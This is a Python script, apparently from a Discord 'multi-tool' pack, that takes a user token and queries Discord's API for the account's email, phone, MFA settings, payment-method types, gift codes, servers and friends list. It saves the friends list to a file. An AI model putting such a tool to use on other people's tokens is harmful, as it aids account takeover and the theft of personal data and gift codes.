import requests
import os
from datetime import datetime, timezone
from pystyle import Colorate, Colors, Center

os.system("cls")

def Continue():
    input("\nAppuie sur Entrer pour continuer...")

def Reset():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

def ErrorModule(e):
    print(f"Erreur lors de l'importation du module: {e}")

def Error(e):
    print(f"Une erreur s'est produite: {e}")

ascii_art = """
 $$$$$$\\  $$$$$$$\\  $$\\    $$\\  $$$$$$\\  $$\\   $$\\  $$$$$$\\  $$$$$$$$\\ $$$$$$$\\        $$$$$$$$\\  $$$$$$\\  $$\\   $$\\ $$$$$$$$\\ $$\\   $$\\       $$$$$$\\ $$\\   $$\\ $$$$$$$$\\  $$$$$$\  
$$  __$$\\ $$  __$$\\ $$ |   $$ |$$  __$$\\ $$$\\  $$ |$$  __$$\\ $$  _____|$$  __$$\\       \\__$$  __|$$  __$$\\ $$ | $$  |$$  _____|$$$\\  $$ |      \\_$$  _|$$$\\  $$ |$$  _____|$$  __$$\\ 
$$ /  $$ |$$ |  $$ |$$ |   $$ |$$ /  $$ |$$$$\\ $$ |$$ /  \\__|$$ |      $$ |  $$ |         $$ |   $$ /  $$ |$$ |$$  / $$ |      $$$$\\ $$ |        $$ |  $$$$\\ $$ |$$ |      $$ /  $$ |
$$$$$$$$ |$$ |  $$ |\\$$\\  $$  |$$$$$$$$ |$$ $$\\$$ |$$ |      $$$$$\\    $$ |  $$ |         $$ |   $$ |  $$ |$$$$$  /  $$$$$\\    $$ $$\\$$ |        $$ |  $$ $$\\$$ |$$$$$\\    $$ |  $$ |
$$  __$$ |$$ |  $$ | \\$$\\$$  / $$  __$$ |$$ \\$$$$ |$$ |      $$  __|   $$ |  $$ |         $$ |   $$ |  $$ |$$  $$<   $$  __|   $$ \\$$$$ |        $$ |  $$ \\$$$$ |$$  __|   $$ |  $$ |
$$ |  $$ |$$ |  $$ |  \\$$$  /  $$ |  $$ |$$ |\\$$$ |$$ |  $$\\ $$ |      $$ |  $$ |         $$ |   $$ |  $$ |$$ |\\$$\\  $$ |      $$ |\\$$$ |        $$ |  $$ |\\$$$ |$$ |      $$ |  $$ |
$$ |  $$ |$$$$$$$  |   \\$  /   $$ |  $$ |$$ | \\$$ |\\$$$$$$  |$$$$$$$$\\ $$$$$$$  |         $$ |    $$$$$$  |$$ | \\$$\\ $$$$$$$$\\ $$ | \\$$ |      $$$$$$\\ $$ | \\$$ |$$ |       $$$$$$  |
\\__|  \\__|\\_______/     \\_/    \\__|  \\__|\\__|  \\__| \\______/ \\________|\\_______/          \\__|    \\______/ \\__|  \\__|\\________|\\__|  \\__|      \\______|\\__|  \\__|\\__|       \______/ 
"""

print(Colorate.Horizontal(Colors.blue_to_cyan, ascii_art))

try:
    print()
    token_discord = input(Colorate.Horizontal(Colors.blue_to_cyan, "Entre le token Discord: "))
    print(Colorate.Horizontal(Colors.blue_to_cyan, "Récupération d'informations..."))

    try:
        headers = {'Authorization': token_discord, 'Content-Type': 'application/json'}
        user = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
        r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)

        status = "Valid" if r.status_code == 200 else "Invalid"

        username_discord = user.get('username', "None") + '#' + user.get('discriminator', "None")
        display_name_discord = user.get('global_name', "None")
        user_id_discord = user.get('id', "None")
        email_discord = user.get('email', "None")
        email_verified_discord = str(user.get('verified', "None"))
        phone_discord = str(user.get('phone', "None"))
        mfa_discord = str(user.get('mfa_enabled', "None"))
        country_discord = user.get('locale', "None")

        created_at_discord = "None"
        if 'id' in user:
            created_at_discord = datetime.fromtimestamp(((int(user['id']) >> 22) + 1420070400000) / 1000, timezone.utc)

        nitro_discord = {0: 'False', 1: 'Nitro Classic', 2: 'Nitro Boosts', 3: 'Nitro Basic'}.get(user.get('premium_type'), 'None')

        avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user.get('avatar')}.png"
        if requests.get(avatar_url_discord).status_code != 200:
            avatar_url_discord = "None"

        avatar_discord = user.get('avatar', "None")
        avatar_decoration_discord = str(user.get('avatar_decoration_data', "None"))
        public_flags_discord = str(user.get('public_flags', "None"))
        flags_discord = str(user.get('flags', "None"))
        banner_discord = user.get('banner', "None")
        banner_color_discord = user.get('banner_color', "None")
        accent_color_discord = user.get("accent_color", "None")
        nsfw_discord = str(user.get('nsfw_allowed', "None"))
        linked_users_discord = ' / '.join([str(linked_user) for linked_user in user.get('linked_users', [])]) or "None"
        bio_discord = "\n" + user.get('bio', "None")

        authenticator_types_discord = ' / '.join([str(authenticator_type) for authenticator_type in user.get('authenticator_types', [])]) or "None"

        guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers=headers)
        guild_count = "None"
        owner_guild_count = "None"
        owner_guilds_names = "None"

        if guilds_response.status_code == 200:
            guilds = guilds_response.json()
            guild_count = len(guilds)
            owner_guilds = [guild for guild in guilds if guild['owner']]
            owner_guild_count = f"({len(owner_guilds)})"
            owner_guilds_names = "\n" + "\n".join([f"{guild['name']} ({guild['id']})" for guild in owner_guilds])

        billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
        payment_methods_discord = ' / '.join(['CB' if method['type'] == 1 else 'Paypal' if method['type'] == 2 else 'Other' for method in billing_discord]) or "None"

        friends_response = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers)
        friends_discord = "None"

        if friends_response.status_code == 200:
            friends = friends_response.json()
            friends_list = [f"{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})" for friend in friends if friend['type'] not in [64, 128, 256, 1048704]]
            friends_discord = ' / '.join(friends_list) or "None"

            # Writing friends list to a file with UTF-8 encoding
            with open('friends_list.txt', 'w', encoding='utf-8') as file:
                for friend in friends_list:
                    file.write(friend + '\n')

        gift_codes_response = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=headers)
        gift_codes_discord = "None"

        if gift_codes_response.status_code == 200:
            gift_codes = gift_codes_response.json()
            codes = [f"Gift: {gift_code['promotion']['outbound_title']}\nCode: {gift_code['code']}" for gift_code in gift_codes]
            gift_codes_discord = '\n\n'.join(codes) if codes else "None"

    except Exception as e:
        print(f"Erreur lors de la récupération des informations: {e}")

    print(Colorate.Horizontal(Colors.blue_to_cyan, f"""
Status : {status}
Token : {token_discord}
Username : {username_discord}
Nom d'affichage : {display_name_discord}
Id : {user_id_discord}
Compte créé le : {created_at_discord}
Pays : {country_discord}
Email : {email_discord}
Verifié : {email_verified_discord}
Numéro de téléphone : {phone_discord}
Nitro : {nitro_discord}
Comptes Liés : {linked_users_discord}
Décoration d'avatar : {avatar_decoration_discord}
Avatar : {avatar_discord}
Avatar URL : {avatar_url_discord}
Accent Color : {accent_color_discord}
Bannière : {banner_discord}
Couleur de bannière : {banner_color_discord}
Flags : {flags_discord}
Flags Publics : {public_flags_discord}
NSFW : {nsfw_discord}
Authentication à Multi-Facteurs : {mfa_discord}
Type d'Authenticateur : {authenticator_types_discord}
Facturation : {payment_methods_discord}
Gift Code : {gift_codes_discord}
Serveurs : {guild_count}
Serveurs Possédés : {owner_guild_count} {owner_guilds_names}
Bio : {bio_discord}
"""))

    Continue()
    Reset()
    input(f"\nPress ENTER to exit")
except Exception as e:
    Error(e)
    input(f"\nPress ENTER to exit...")
